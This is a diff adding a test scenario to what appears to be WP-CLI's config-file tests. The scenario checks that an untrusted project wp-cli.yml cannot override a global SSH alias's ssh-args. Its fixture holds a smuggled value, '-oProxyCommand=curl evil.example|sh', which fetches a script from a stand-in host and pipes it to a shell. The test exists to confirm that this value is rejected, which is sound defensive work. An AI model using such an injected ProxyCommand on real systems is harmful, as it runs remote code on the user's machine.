@@ -1297,3 +1297,23 @@ Feature: Have a config file
       """
       Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
       """
+
+  Scenario: Project config redefining an existing global alias's ssh-args is gated
+    Given an empty directory
+    And a user-config.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+      """
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+        ssh-args: -oProxyCommand=curl evil.example|sh
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
